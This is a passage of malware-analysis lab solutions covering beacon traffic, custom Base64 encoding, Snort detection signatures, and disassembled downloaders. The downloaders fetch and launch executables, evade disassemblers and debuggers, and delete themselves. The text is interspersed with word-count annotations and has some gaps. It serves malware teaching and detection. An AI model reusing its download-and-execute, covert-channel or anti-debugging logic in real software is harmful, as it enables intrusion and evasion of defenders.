This Snort rule includes a content string only for the GET / at the start of 
the packet, but it’s usually better to have a more unique content string for 
improved packet processing. The urilen keyword ensures that the URI is a 
specific length—in this case, greater than 32 characters (which accounts for 
the additional characters beyond the first path segment).
Now for the second signature. The Snort rule for this signature could be 
as follows:
[Word Count: 76]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.2 Base64 and 
png"; urilen:>32; uricontent:".png"; pcre:"/\/[A-Z0-9a-z+\/]{24,}([A-Z0-9a-z+\
/])\/\1\.png/"; sid:20001412; rev:1;)
[Word Count: 17]

This Snort rule searches for the .png content in the regular expression 
before testing the PCRE regular expression in order to improve packet-
processing performance. It also adds a check for the URI length, which has 
a known minimum.
In addition to the preceding signatures, we could also target areas like the 
domain name (www.practicalmalwareanalysis.com) and the fact that the malware 
downloads an executable. Combining signatures is often an effective strat-
egy. For example, a malware signature that produces regular false positives 
may still be effective if combined with a signature that triggers on an execut-
able download.
[Word Count: 98]

1.
The attacker may find static IP addresses more difficult to manage than 
domain names. Using DNS allows the attacker to deploy his assets to any 
computer and dynamically redirect his bots by changing only a DNS
[Word Count: 37]

address. The defender has various options for deploying defenses for 
both types of infrastructure, but for similar reasons, IP addresses can be 
more difficult to deal with than domain names. This fact alone could 
lead an attacker to choose static IP addresses over domains.
[Word Count: 44]

2.
The malware uses the WinINet libraries. One disadvantage of these librar-
ies is that a hard-coded User-Agent needs to be provided, and optional 
headers need to be hard-coded if desired. One advantage of the WinINet 
libraries over the Winsock API, for example, is that some elements, such 
as cookies and caching headers, are provided by the OS.
[Word Count: 58]

3.
A string resource section in the PE file contains the URL that is used 
for command and control. The attacker can use the resource section to 
deploy multiple backdoors to multiple command-and-control locations 
without needing to recompile the malware.
[Word Count: 40]

4.
The attacker abuses the HTTP User-Agent field, which should contain the 
application information. The malware creates one thread that encodes 
outgoing information in this field, and another that uses a static field to 
indicate that it is the “receive” side of the channel.
[Word Count: 44]

5.
The initial beacon is an encoded command-shell prompt.
[Word Count: 9]

6.
While the attacker encodes outgoing information, he doesn’t encode 
the incoming commands. Also, because the server must distinguish 
between the two communication channels via the static elements of the 
User-Agent fields, this server dependency is apparent and can be tar-
geted with signatures.
[Word Count: 44]

7.
The encoding scheme is Base64, but with a custom alphabet.
[Word Count: 11]

8.
Communication is terminated using the keyword exit. When exiting, the 
malware tries to delete itself.
[Word Count: 16]

9.
This malware is a small, simple backdoor. Its sole purpose is to provide a 
command-shell interface to a remote attacker that won’t be detected by 
common network signatures that watch for outbound command-shell 
activity. This particular malware is likely a throwaway component of an 
attacker’s toolkit, which is supported by the fact that the tool tries to 
delete itself.
[Word Count: 60]

We begin by performing dynamic analysis on the malware. The malware ini-
tially sends a beacon with an odd User-Agent string:
[Word Count: 21]

GET /tenfour.html HTTP/1.1
User-Agent: (!<e6LJC+xnBq90daDNB+1TDrhG6aWG6p9LC/iNBqsGi2sVgJdqhZXDZoMMomKGoqx
UE73N9qH0dZltjZ4RhJWUh2XiA6imBriT9/oGoqxmCYsiYG0fonNC1bxJD6pLB/1ndbaS9YXe9710A
6t/CpVpCq5m7l1LCqR0BrWy
Host: 127.0.0.1
Cache-Control: no-cache
[Word Count: 11]

A short time later, it sends a second beacon:
[Word Count: 9]

GET /tenfour.html HTTP/1.1
User-Agent: Internet Surf
Host: 127.0.0.1
Cache-Control: no-cache
[Word Count: 10]

set up the new process so that the stdin and stdout associated with the com-
mand process handles are available.
[Word Count: 20]

Figure 14-3L: Function graph for functions connected with Internet functions
[Word Count: 10]

internal function at 0x40155B takes two input parameters and outputs the 
primary content of the User-Agent string. This encoding function is a custom 
Base64 variant that uses this Base64 string:
[Word Count: 30]

WXYZlabcd3fghijko12e456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz
[Word Count: 1]

When the initial beacon string is decoded, the result is as follows:
[Word Count: 12]

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 10]

NOTE
We could also have used dynamic analysis to gain insight into the malware. The 
encoding function at 0x40155B could have been identified by the Base64 strings it 
contains. By setting a breakpoint at the function in a debugger, we would have seen the 
Windows command prompt as an argument prior to encoding. The encoded command 
prompt varies a bit based on the specific OS and username, which is why we found this 
beacon changing based on the host or user.
[Word Count: 81]

For signatures other than the URL, we target the static User-Agent field, the 
static characters of the encoded User-Agent, and the length and character 
restrictions of the encoded command-shell prompt, as shown in Listing 14-4L.
[Word Count: 35]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.1 Suspicious 
User-Agent (Internet Surf)"; content: "User-Agent\:|20|Internet|20|Surf"; 
http_header; sid:20001421; rev:1;)
[Word Count: 17]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.2 Suspicious 
User-Agent (starts (!<)"; content: "User-Agent\:|20|(!<"; http_header; 
sid:20001422; rev:1;)
[Word Count: 17]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.3 Suspicious 
User-Agent (long B64)"; content:"User-Agent\:|20|"; content:!"|20|"; distance:0; 
within:100; pcre:"/User-Agent:\x20[^\x0d]{0,5}[A-Za-z0-9+\/]{100,}/"; 
sid:20001423; rev:1;)
[Word Count: 19]

Listing 14-4L: Snort signatures for Lab 14-2
[Word Count: 7]

1.
The hard-coded headers include Accept, Accept-Language, UA-CPU, Accept-
Encoding, and User-Agent. The malware author mistakenly adds an addi-
tional User-Agent: in the actual User-Agent, resulting in a duplicate 
string: User-Agent: User-Agent: Mozilla.... The complete User-Agent 
header (including the duplicate) makes an effective signature.
[Word Count: 44]

2.
Both the domain name and path of the URL are hard-coded only where 
the configuration file is unavailable. Signatures should be made for this 
hard-coded URL, as well as any configuration files observed. However, it 
would probably be more fruitful to target just the hard-coded compo-
nents than to link them with the more dynamic URL. Because the URL 
used is stored in a configuration file and can be changed with one of the 
commands, we know that it is ephemeral.
[Word Count: 82]

3.
The malware obtains commands from specific components of a web 
page from inside noscript tags, which is similar to the Comment field 
example mentioned in the chapter. Using this technique, malware can 
beacon to a legitimate web page and receive legitimate content, making 
analysis of malicious versus legitimate traffic more difficult for a defender.
[Word Count: 55]

6.
The malware commands include quit, download, sleep, and redirect. The 
quit command simply quits the program. The download command down-
loads and runs an executable, except that, unlike in the previous lab, the 
attacker can specify the URL from which to download. The redirect com-
mand modifies the configuration file used by the malware so that there is 
a new beacon URL.
[Word Count: 63]

7.
This malware is inherently a downloader. It comes with some important 
advantages, such as web-based control and the ability to easily adjust as 
malicious domains are identified and shut down.
[Word Count: 31]

8.
Some distinct elements of malware behavior that may be independently 
targetable include the following:
[Word Count: 15]


Signatures related to the statically defined domain and path and 
similar information from any dynamically discovered URLs
[Word Count: 18]


Signatures related to the static components of the beacon
[Word Count: 10]


Signatures that identify the initial requirements for a command
[Word Count: 10]


Signatures that identify specific attributes of command and argu-
ment pairs
[Word Count: 12]

9.
See the detailed analysis for specific signatures.
[Word Count: 8]

Running the malware, we see that it produces the following beacon packet:
[Word Count: 12]

GET /start.htm HTTP/1.1
Accept: */*
Accept-Language: en-US
UA-CPU: x86
Accept-Encoding: gzip, deflate
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 
.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Host: www.practicalmalwareanalysis.com
Cache-Control: no-cache
[Word Count: 31]

We begin by identifying the networking functions used by the malware. 
Looking at the imports, we see functions from two libraries: WinINet and 
COM. The functions used include InternetOpenA, InternetOpenUrlA, Internet-
CloseHandle, and InternetReadFile.
Starting with the WinINet functions, navigate to the function containing 
InternetOpenUrlA at 0x004011F3. Notice that there are some static strings in 
the code leading up to InternetOpenA as shown in Listing 14-5L.
[Word Count: 66]

"Accept: */*\nAccept-Language: en-US\nUA-CPU: x86\nAccept-Encoding: gzip, 
deflate"
"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 
3.0.4506.2152; .NET CLR 3.5.30729)"
[Word Count: 20]

Listing 14-5L: Static strings used in beacon
[Word Count: 7]

backtracking, it is clear that one of the arguments is the string that has been 
read in from the Internet, and the other is the URL that originally came 
from the configuration file. The search for the / is a backward search within 
the URL. Once found, the / is converted to a NULL to NULL-terminate the 
string. Essentially, this block is searching for the URL (minus the filename) 
within the returned buffer.
[Word Count: 73]

Figure 14-4L: Obfuscated string comparison
[Word Count: 5]

The second block is a search for the static string 96' starting at the end of 
the truncated URL. There are two paths at the bottom of the function: one 
representing a failure to find the desired characteristics and one represent-
ing success. Notice the large number of paths focused on the failure state 
(loc_401141). These paths represent an early termination of the search.
In summary, assuming that the default URL is being used, the filter func-
tion in this part of the code is looking for the following (the ellipsis after the 
noscript tag represents variable content):
[Word Count: 98]

<noscript>... http://www.practicalmalwareanalysis.comreturned_content96'
[Word Count: 2]

004016BF         mov     ecx, [ebp+var_10]
004016C2         movsx   edx, byte ptr [ecx]
[Word Count: 10]

004016C5         mov     [ebp+var_14], edx
004016C8         mov     eax, [ebp+var_14]
004016CB         sub     eax, 'd'
[Word Count: 12]

Figure 14-5L: Function graph 
showing the connection between 
the 'r' and 'd' commands
[Word Count: 13]

While this string looks somewhat similar to a Base64 string, it doesn’t 
have capital letters, and it has only 39 characters. (A URL can be adequately 
described with only lowercase letters.) Given our understanding of the algo-
rithm, let’s encode the default URL for the malware with the encoding shown 
in Figure 14-6L.
[Word Count: 53]

Figure 14-6L: Example encoding of default URL with custom cipher
[Word Count: 10]

As you can see, any encoding of a URL that starts with http:// will always 
have the string 08202016370000.
Now, let’s use what we’ve learned to generate a suitable set of signatures 
for the malware. Overall, we have three kinds of communication: beacon 
packets, commands embedded in web pages, and a request to download and 
execute a file. Since the request to download is based entirely on the data 
that comes from the attacker, it is difficult to produce a signature for it.
[Word Count: 83]

The beacon packet has the following structure:
[Word Count: 7]

GET /start.htm HTTP/1.1
Accept: */*
Accept-Language: en-US
UA-CPU: x86
Accept-Encoding: gzip, deflate
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 
.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Host: www.practicalmalwareanalysis.com
Cache-Control: no-cache
[Word Count: 31]

The elements in italic are defined by the URL, and they can be ephem-
eral (though they should certainly be used if known). The bold elements are 
static and come from two different strings in the code (see Listing 14-5L). 
Since the attacker made a mistake by including an extra User-Agent:, the obvi-
ous signature to target is the specific User-Agent string with the additional 
User-Agent header:
[Word Count: 67]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.3.1 Specific 
User-Agent with duplicate header"; content:"User-Agent|3a20|User-Agent|3a20|
Mozilla/4.0|20|(compatible\;|20|MSIE|20|7.0\;|20|Windows|20|NT|20|5.1\;|20|
.NET|20|CLR|20|3.0.4506.2152\;|20|.NET|20|CLR|20|3.5.30729)"; http_header; 
sid:20001431; rev:1;)
[Word Count: 19]

08 20 20 16 37 00 00 23 23 23 38 16 18 01 03 20 09 03 01 12
[Word Count: 20]

m
a
l
w
a
r
e
a
n
a
l
y
s
i
s
.
c
o
m
/
s
t
a
r
t
.
h
t
m
[Word Count: 29]

13 01 12 23 01 18 05 01 14 01 12 25 19 09 19 38 03 15 13 00 19 20 01 18 20 38 08 20 13
[Word Count: 29]

The overall picture of the command provided by the web page is the following:
[Word Count: 14]

<noscript>... truncated_url/cmd_char.../arg96'
[Word Count: 2]

The malware searches for several static elements in the web page, includ-
ing the noscript tag, the first characters of the URL (http://), and the trailing 
96'. Since the parsing function that reads the cmd_char structure is in a differ-
ent area of the code and may be changed independently, it should be tar-
geted separately. Thus, the following is the signature for targeting just the 
static elements expected by the malware:
[Word Count: 72]

alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.2 Noscript 
tag with ending"; content:"<noscript>"; content:"http\://"; distance:0; 
within:512; content:"96'"; distance:0; within:512; sid:20001432; rev:1;)
[Word Count: 21]

The other section of code to target is the command processing. The 
commands accepted by the malware are listed in Table 14-2L.
[Word Count: 22]

The download and redirect functions both share the same routine to 
decode the URL (as shown in Figure 14-5L), so we will target these two 
commands together:
[Word Count: 27]

alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.3 Download 
or Redirect Command"; content:"/08202016370000"; pcre:"/\/[dr][^\/]*\/
08202016370000/"; sid:20001433; rev:1;)
[Word Count: 17]

alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.4 Sleep 
Command"; content:"96'"; pcre:"/\/s[^\/]{0,15}\/[0-9]{2,20}96'/"; sid:20001434; 
rev:1;)
[Word Count: 14]

1.
This program uses false conditional branches: an xor eax, eax, followed 
by jz.
[Word Count: 14]

2.
The program tricks the disassembler into disassembling the opcode 0xE8, 
the first of a 5-byte call instruction, which immediately follows the jz 
instruction.
[Word Count: 24]

3.
The false conditional branch technique is used five times in this program.
[Word Count: 13]

4.
The command-line argument pdq will cause the program to print 
“Good Job!”
[Word Count: 13]

First, we load the file into IDA Pro and scroll to the main function at address 
0x401000. A few lines from the start of the function, memory address 
0x0040100E, we see the first signs of anti-disassembly, as shown in Listing 15-1L.
[Word Count: 41]

00401006 83 7D 08 02                  cmp     dword ptr [ebp+8], 2
0040100A 75 52                        jnz     short loc_40105E
0040100C 33 C0                        xor     eax, eax
0040100E 74 01                        jz      short near ptr loc_401010+1 
00401010
00401010               loc_401010:                       ; CODE XREF:0040100Ej
00401010 E8 8B 45 0C 8B 
call    near ptr 8B4C55A0h
[Word Count: 47]

Listing 15-1L: jz jumping into the middle of a call instruction
[Word Count: 11]

As shown at , the jz instruction appears to be jumping into the middle 
of the 5-byte call instruction at . We must determine whether this branch 
will be executed.
[Word Count: 30]

0040100E 74 01                        jz      short near ptr unk_401011 
0040100E        ; --------------------------------------------------------------
00401010 E8                           db 0E8h
00401011 8B         unk_401011 
db  8Bh ; ï      ; CODE XREF: 0040100Ej
[Word Count: 28]

Listing 15-2L: Converting the call instruction from Listing 15-1L to data
[Word Count: 11]

1.
The URL initially requested is http://www.practicalmalwareanalysis.com/
bamboo.html.
[Word Count: 8]

2.
The User-Agent string is generated by adding 1 to each letter and num-
ber in the hostname (Z and 9 are rotated to A and 0).
[Word Count: 27]

3.
The program looks for the string Bamboo:: in the page it requested.
[Word Count: 13]

4.
The program searches beyond the Bamboo:: string to find an additional ::, 
which it converts to a NULL terminator. The string in between Bamboo and 
the terminator is downloaded to a file named Account Summary.xls.exe 
and executed.
[Word Count: 38]

Open the binary with IDA Pro and scroll to the main function at offset 
0x00401000. We will begin with disarming this function by reading it top to 
bottom, fixing each countermeasure until we reach the logical end of the 
function. The first countermeasure we encounter is shown in Listing 15-3L 
at address 0x0040115A.
[Word Count: 53]

0040115A           test    esp, esp
0040115C           jnz     short near ptr loc_40115E+1 
0040115E
0040115E loc_40115E:                             ; CODE XREF: 0040115Cj
0040115E           jmp     near ptr 0AA11CDh 
0040115E ; ----------------------------------------------------------------------
00401163            db 6Ah
00401164            dd 0E8006A00h, 21Ah, 5C858B50h, 50FFFEFDh, 206415FFh, 85890040h
00401164            dd 0FFFFFD64h, 0FD64BD83h, 7400FFFFh, 0FC8D8D24h, 51FFFFFEh
[Word Count: 45]

00401215 loc_401215:                             ; CODE XREF: loc_401215j
00401215 EB FF           jmp     short near ptr loc_401215+1
[Word Count: 15]

At  is a 2-byte jmp instruction whose target is the second byte of itself. 
The second byte is the first byte of the next instruction. Turn this instruction 
into data and put your cursor on the second byte, location 0x00401216, and 
turn it into code. To force IDA Pro to produce a clean graph, turn the first 
byte of the jmp instruction (0xEB) into a NOP. If you are using the commercial
[Word Count: 73]

version of IDA Pro, select FilePython command, enter PatchByte(0x401215, 
0x90) into the text box, and click OK. Now put your cursor on the location 
0x00401215, which should contain the value db 90h, and convert it to code by 
pressing the C key. 
Continue reading the code until you reach the next countermeasure at 
line 0x00401269, which is shown in Listing 15-5L.
[Word Count: 61]

00401269                 jz      short near ptr loc_40126D+1 
0040126B                 jnz     short near ptr loc_40126D+1 
0040126D
0040126D loc_40126D:                             ; CODE XREF: 00401269j
0040126D                                         ; 0040126Bj
0040126D                 call    near ptr 0FF3C9FFFh 
[Word Count: 30]

Listing 15-5L: False conditionals with the same target
[Word Count: 8]

004012E6                loc_4012E6:                     ; CODE XREF: 004012ECj
004012E6 66 B8 EB 05                    mov     ax, 5EBh 
004012EA 31 C0                          xor     eax, eax
004012EC 74 FA                          jz      short near ptr loc_4012E6+2 
004012EE E8 6A 0A 6A 00                 call    near ptr 0AA1D5Dh
[Word Count: 40]

Listing 15-6L: False conditionals into the middle of the previous instruction
[Word Count: 11]

004012E6 66                             db 66h
004012E7 B8                             db 0B8h ; +
004012E8            ; ------------------------------------------------------------
004012E8
004012E8                loc_4012E8:               ; CODE XREF: 004012ECj
[Word Count: 20]

004012E8 EB 05                          jmp     short loc_4012EF 
004012EA            ; ------------------------------------------------------------
004012EA 31 C0                          xor     eax, eax
004012EC 74 FA                          jz      short loc_4012E8
004012EC            ; ------------------------------------------------------------
004012EE E8                             db 0E8h 
004012EF            ; ------------------------------------------------------------
004012EF
004012EF                loc_4012EF:              ; CODE XREF: loc_4012E8j
004012EF 6A 0A                          push    0Ah
[Word Count: 45]

Listing 15-7L: Manually repaired anti-disassembly code
[Word Count: 6]

0040115F                 push    0
00401161                 push    0
00401163                 push    0
00401167                 push    0
0040116C                 call    buildURL 
0040116D                 push    eax
00401173                 mov     edx, [ebp+var_10114]
00401174                 push    edx
0040117A                 call    ds:InternetOpenUrlA 
[Word Count: 30]

Listing 15-8L: Opening the http://www.practicalmalwareanalysis.com/bamboo.html URL
[Word Count: 6]

Reading the code further, we see that it attempts to open the bamboo.html 
URL returned from buildURL at  using InternetOpenUrlA. In order to determine 
the User-Agent string used by the malware when calling the InternetOpenUrlA 
function, we need to first find the InternetOpen function call and determine 
what data is passed to it. Earlier in the function, we see InternetOpenA called, 
as shown in Listing 15-9L.
[Word Count: 67]

0040113F                 push    0
00401141                 push    0
00401143                 push    0
00401145                 push    1
00401147                 lea     ecx, [ebp+name] 
0040114D                 push    ecx 
0040114E                 call    ds:InternetOpenA
[Word Count: 24]

Listing 15-9L: Setting up the connection via InternetOpenA
[Word Count: 8]

The first argument to InternetOpenA at  is the User-Agent string. ECX is 
pushed as this argument, and the lea instruction loads it with a pointer to a 
location on the stack. IDA Pro’s stack frame analysis has named this location 
name, as seen at . We must scroll up in the function to see where name is get-
ting populated. Near the beginning of the function, shown in Listing 15-10L, 
we see a reference to the name location at .
[Word Count: 81]

00401047                 push    100h            ; namelen
0040104C                 lea     eax, [ebp+name] 
00401052                 push    eax             ; name
00401053                 call    ds:gethostname
[Word Count: 18]

Listing 15-10L: Using gethostname to get the local machine’s name
[Word Count: 10]

0040118F                 push    eax
00401190                 push    0FFFFh
00401195                 lea     ecx, [ebp+Str] 
0040119B                 push    ecx
0040119C                 mov     edx, [ebp+var_10C]
004011A2                 push    edx
004011A3                 call    ds:InternetReadFile 
...
004011D5                 push    offset SubStr   ; "Bamboo::"
004011DA                 lea     ecx, [ebp+Str] 
[Word Count: 37]

004011E0                 push    ecx             ; Str
004011E1                 call    ds:strstr 
[Word Count: 9]

Listing 15-11L: Reading and parsing the downloaded HTML
[Word Count: 8]

The strstr function at  is used to find a substring within a larger string. 
In this case, it is finding the string Bamboo:: within the buffer Str, which con-
tains all the data we retrieved from the initial URL. The code immediately 
following the strstr call is shown in Listing 15-12L.
[Word Count: 52]

004011E7                 add     esp, 8
004011EA                 mov     [ebp+var_108], eax 
004011F0                 cmp     [ebp+var_108], 0
004011F7                 jz      loc_401306
004011FD                 push    offset asc_40303C ; "::"
00401202                 mov     edx, [ebp+var_108]
00401208                 push    edx             ; Str
00401209                 call    ds:strstr 
0040120F                 add     esp, 8
00401212                 mov     byte ptr [eax], 0 
...
00401232                 mov     eax, [ebp+var_108]
00401238                 add     eax, 8 
0040123E                 mov     [ebp+var_108], eax
[Word Count: 60]

Listing 15-12L: Parsing a string separated by Bamboo:: and ::
[Word Count: 10]

00401247                 push    0
00401249                 push    0
0040124B                 push    0
0040124D                 push    0
0040124F                 mov     ecx, [ebp+var_108] 
00401255                 push    ecx
00401256                 mov     edx, [ebp+var_10114]
0040125C                 push    edx
0040125D                 call    ds:InternetOpenUrlA
[Word Count: 30]

Listing 15-13L: Opening another URL in order to download more malware
[Word Count: 11]

The second argument (var_108) to InternetOpenUrlA is the URL to open. 
Therefore, the data in between the Bamboo:: and the trailing colons is intended 
to be a URL for the program to download. Analysis of the code between lines 
0x0040126E and 0x004012E3 (not shown here), reveals that the URL opened 
in Listing 15-13L is downloaded to the file Account Summary.xls.exe, which is 
then launched by a call to ShellExecute on line 0x00401300.
[Word Count: 72]

1.
The malicious code is initially called by overwriting the return pointer 
from the main function.
[Word Count: 16]

2.
The malicious code downloads a file from a URL and launches it with 
WinExec.
[Word Count: 15]

3.
The URL used by the program is http://www.practicalmalwareanalysis.com/
tt.html.
[Word Count: 10]

4.
The filename used by the program is spoolsrv.exe.
[Word Count: 9]

0040100C                 mov     eax, 400000h 
00401011                 or      eax, 148Ch 
00401016                 mov     [ebp+4], eax 
[Word Count: 15]

Listing 15-14L: Calculating an address and loading it on the stack
[Word Count: 11]

0040148C                 push    ebp
0040148D                 mov     ebp, esp
0040148F                 push    ebx
00401490                 push    esi
00401491                 push    edi
00401492                 xor     eax, eax
00401494                 jz      short near ptr loc_401496+1 
00401496
00401496 loc_401496:                             ; CODE XREF: 00401494j
00401496                 jmp     near ptr 4054D503h 
[Word Count: 40]

Listing 15-15L: The orphaned code assembled at 0x40148C
[Word Count: 8]

00401497                 push    offset dword_4014C0
0040149C                 push    large dword ptr fs:0
004014A3                 mov     large fs:0, esp
004014AA                 xor     ecx, ecx
004014AC                 div     ecx 
004014AE               push    offset aForMoreInforma ; "For more information..."
004014B3               call    printf
[Word Count: 34]

Listing 15-16L: Building an exception handler and triggering an exception
[Word Count: 10]

The lines at  and  are placed there solely to pose as a decoy; they will 
never be executed. The first five lines of this fragment build an exception 
handler and trigger a divide-by-zero exception at . (The ECX will always be 
zero because of the xor ecx,ecx in the previous instruction.) 
The location handling the exception is 0x004014C0, as shown in List-
ing 15-17L.
[Word Count: 66]

004014C0 dword_4014C0    dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
004014C0                                         ; DATA XREF: loc_401497o
004014D4                 dd 0EB08C483h, 0E848C0FFh, 0
[Word Count: 18]

Listing 15-17L: The exception-handling code currently defined as data
[Word Count: 9]

IDA Pro did not recognize the data in Listing 15-17L as code, and has 
chosen instead to represent it as a series of DWORDs. Place your cursor on the 
first DWORD and press the C key to change this into code.
[Word Count: 41]

After successfully changing the data in Listing 15-17L to code, it is dis-
played as shown in Listing 15-18L.
[Word Count: 19]

004014C0                 mov     esp, [esp+8]
004014C4                 mov     eax, large fs:0
004014CA                 mov     eax, [eax]
004014CC                 mov     eax, [eax]
004014CE                 mov     large fs:0, eax
004014D4                 add     esp, 8
004014D7                 jmp     short near ptr loc_4014D7+1 
[Word Count: 33]

Listing 15-18L: Properly disassembled exception-handling code
[Word Count: 6]

The code in Listing 15-18L unlinks the structured exception handler 
and removes the exception record from the stack. The last line of the code is 
an anti-disassembly countermeasure in the form of an inward-pointing jmp 
instruction at . Convert the jmp to data by placing your cursor at 0x4014D7 
and pressing the D key. Then select line 0x004014D8 and convert it to code 
with the C key. 
After correcting the anti-disassembly countermeasure shown in Listing 15-
18L, we see that the rest of the code is properly disassembled with a call to 
URLDownloadToFileA, seen at  in Listing 15-19L.
[Word Count: 99]

004014E6                 push    offset unk_403010
004014EB                 call    sub_401534 
004014F0                 add     esp, 4
004014F3                 push    offset unk_403040
004014F8                 call    sub_401534 
004014FD                 add     esp, 4
00401500                 push    0
00401502                 push    0
00401504                 push    offset unk_403040 
00401509                 push    offset unk_403010 
0040150E                 push    0
00401510                 call    URLDownloadToFileA 
[Word Count: 47]

Listing 15-19L: Downloading a file from a URL
[Word Count: 8]

false conditional in the form of a combination of jz and jnz together to 
create an unconditional jump, at  and .
[Word Count: 22]

00401515                 jz      short near ptr loc_401519+1 
00401517                 jnz     short near ptr loc_401519+1 
00401519
00401519 loc_401519:                             ; CODE XREF: 00401515j
00401519                                         ; 00401517j
00401519                 call    near ptr 40A81588h
0040151E                 xor     [eax+0], al
00401521                 call    ds:WinExec
[Word Count: 36]

Listing 15-20L: The final anti-disassembly technique encountered in the malware
[Word Count: 10]

The target of the jumps is 0x0040151A. Place your cursor on line 
0x00401519 and press D to turn this line into data. Then select line 
0x0040151A and press C to turn it into code. Continue this process 
until you are left with the code shown in Listing 15-21L.
[Word Count: 48]

0040151A                 push    0
0040151C                 push    offset unk_403040
00401521                 call    ds:WinExec 
00401527                 push    0
00401529                 call    ds:ExitProcess
[Word Count: 17]

Listing 15-21L: Using WinExec to launch the downloaded file
[Word Count: 9]

The call to WinExec at  will launch whatever is specified by the buffer 
unk_403040, which will contain the value spoolsrv.exe. The program then ter-
minates manually with ExitProcess.
[Word Count: 29]

1.
The malware checks the status of the BeingDebugged, ProcessHeap, and 
NTGlobalFlag flags to determine if it is being run in a debugger.
[Word Count: 23]

2.
If any of the malware’s anti-debugging techniques succeed, it will termi-
nate and remove itself from disk.
[Word Count: 18]

3.
You can manually change the jump flags in OllyDbg during runtime, but 
doing so will get tedious since this malware checks the memory struc-
tures so frequently. Instead, modify the structures the malware checks in 
memory either manually or by using an OllyDbg plug-in like PhantOm 
or the Immunity Debugger (ImmDbg) PyCommand hidedebug.
[Word Count: 54]

4.
See the detailed analysis for a step-by-step way to dump and modify the 
structures in OllyDbg.
[Word Count: 17]

5.
Both the OllyDbg plug-in PhantOm and the ImmDbg PyCommand 
hidedebug will thwart this malware’s checks.
[Word Count: 16]

Figure 16-1L: Anti-debugging checks contained at the beginning of most functions in 
Lab 16-1
[Word Count: 14]

004010CE         lea     eax, [ebp+Parameters]
004010D4         push    eax                     ; lpParameters
004010D5         push    offset File             ; "cmd.exe"
004010DA         push    0                       ; lpOperation
004010DC         push    0                       ; hwnd
004010DE         call    ds:ShellExecuteA 
004010E4         push    0                       ; Code
004010E6         call    _exit 
[Word Count: 38]

Listing 16-1L: Function sub_401000 with code to terminate the malware and remove it 
from disk
[Word Count: 15]

Function sub_401000 ends at  with a call to _exit, terminating the 
malware. The call to ShellExecuteA at  removes the malware from disk by 
launching cmd.exe using the parameters /c del Lab16-01.exe. Checking the 
cross-references to sub_401000, we find 79 of them, most of which come from 
the anti-debugging code shown in Figure 16-1L. Let’s dissect Figure 16-1L 
in more detail.
[Word Count: 62]

Listing 16-2L shows the code in the top box of Figure 16-1L.
[Word Count: 12]

00403554         mov     eax, large fs:30h 
0040355A         mov     bl, [eax+2] 
0040355D         mov     [ebp+var_1820], bl
00403563         movsx   eax, [ebp+var_1820]
0040356A         test    eax, eax 
0040356C         jz      short loc_403573 
0040356E         call    sub_401000
[Word Count: 31]

Listing 16-2L: Checking the BeingDebugged flag
[Word Count: 6]

Listing 16-3L shows the code in the middle box of Figure 16-1L.
[Word Count: 12]

00401410 64 A1 30 00 00+        mov     eax, large fs:30h 
00401416 8B 40 18               mov     eax, [eax+18h] 
00401419                        db      3Eh 
00401419 3E 8B 40 10            mov     eax, [eax+10h] 
0040141D 89 45 F0               mov     [ebp+var_10], eax
00401420 83 7D F0 00            cmp     [ebp+var_10], 0 
00401424 74 05                  jz      short loc_40142B
00401426 E8 D5 FB FF FF         call    sub_401000
[Word Count: 62]

Listing 16-3L: Checking the ProcessHeap flag
[Word Count: 6]

Figure 16-2L: Using the command line to dump 
the BeingDebugged flag and then setting it to 0
Figure 16-3L: OllyDbg PhantOm 
plug-in options
[Word Count: 23]

NOTE
When you encounter erroneous db instructions, you can ignore them, but you should 
display opcodes to confirm that the byte is disassembled properly in an instruction.
[Word Count: 27]

The 4-byte ForceFlags field is nonzero when the ProcessHeap structure is 
created in the debugger, and the ForceFlags field must be 0 in order for the 
malware to run normally within a debugger. We need to change it to 0 when 
debugging, either manually with the OllyDbg Command Line plug-in or by 
using the OllyDbg PhantOm plug-in, as with the BeingDebugged flag. 
To set the ForceFlags field to 0 manually, launch the Command Line 
plug-in by selecting PluginsCommand Line, and then enter the following 
command in the window:
[Word Count: 88]

The command dumps the ForceFlags field of the ProcessHeap structure 
into the dump window. Select all 4 bytes of the ForceFlags field, and then 
right-click and select BinaryFill With 00’s to set the 4 bytes to 0.
[Word Count: 37]

NOTE
In Windows 7, offset 0x10 is no longer the ForceFlags field, so this anti-debugging 
method may end up falsely indicating the presence of a debugger on newer versions of 
Windows (post-XP).
[Word Count: 32]

Alternatively, use the PhantOm plug-in to protect against the ProcessHeap 
anti-debugging technique. The PhantOm plug-in will cause this technique to 
fail when you start the program with debug heap creation disabled. (You 
don’t need to modify the settings as you did for the BeingDebugged flag.)
[Word Count: 45]

NOTE
In WinDbg, you can start a program with the debug heap disabled by using the –hd 
option, which causes the ForceFlags field to always be 0. For example, the command 
windbg –hd Lab16-01.exe creates heaps in normal mode, rather than in debug mode.
[Word Count: 44]

The code in the lower box of Figure 16-1L is shown in Listing 16-4L.
[Word Count: 14]

00403594         mov     eax, large fs:30h 
0040359A         db      3Eh 
0040359A         mov     eax, [eax+68h] 
0040359E         sub     eax, 70h
[Word Count: 19]

004035A1         mov     [ebp+var_1828], eax
004035A7         cmp     [ebp+var_1828], 0
004035AE         jnz     short loc_4035B5
004035B0         call    sub_401000
[Word Count: 15]

Listing 16-4L: Checking the NTGlobalFlag flag
[Word Count: 6]

This dumps the NTGlobalFlag flag into the dump window. As with the 
